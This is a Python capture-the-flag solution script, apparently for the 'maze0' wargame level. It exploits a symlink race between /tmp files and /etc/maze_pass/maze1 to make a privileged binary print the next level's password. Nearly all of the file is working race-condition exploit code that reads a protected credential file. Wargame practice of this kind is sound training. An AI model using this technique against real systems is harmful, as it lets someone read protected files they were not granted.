import time
import subprocess
from subprocess import Popen
import logging
import threading

# copy script to /tmp/maze0.py and run with python3 /tmp/maze0.py6543qayxcvbn-

threads_alive = True
logging.basicConfig(level=logging.INFO)


symlink = "/tmp/128ecf542a35ac5270a87dc740918404"
readable_symtarget = "/tmp/readable-target"
pw_symtarget = "/etc/maze_pass/maze1"


results = []


def switch_symlink_target():
    global threads_alive
    Popen(["touch", readable_symtarget])
    Popen("echo -n gil > " + readable_symtarget, shell=True)
    while threads_alive:
        subprocess.run(["ln", "-sf", readable_symtarget, symlink])
        subprocess.run(["ln", "-sf", pw_symtarget,  symlink])


def run_program():
    global results
    global threads_alive
    while threads_alive:
        try:
            stdout = subprocess.check_output(["/maze/maze0"])
            if stdout:
                logging.info("stdout: " + stdout.decode("utf-8"))
                results.append(stdout)
        except Exception as err:
            print("error: {0}".format(err))
            continue


thread1 = threading.Thread(target=switch_symlink_target)
thread1.start()
time.sleep(0.5)

thread2 = threading.Thread(target=run_program)
thread2.start()

# try race condition for 15 seconds
time.sleep(15)
threads_alive = False
time.sleep(1)

# remove duplicates
results = list(dict.fromkeys(results))
for e in results:
    logging.info("results:  " + e.decode("utf-8"))

# hashaachon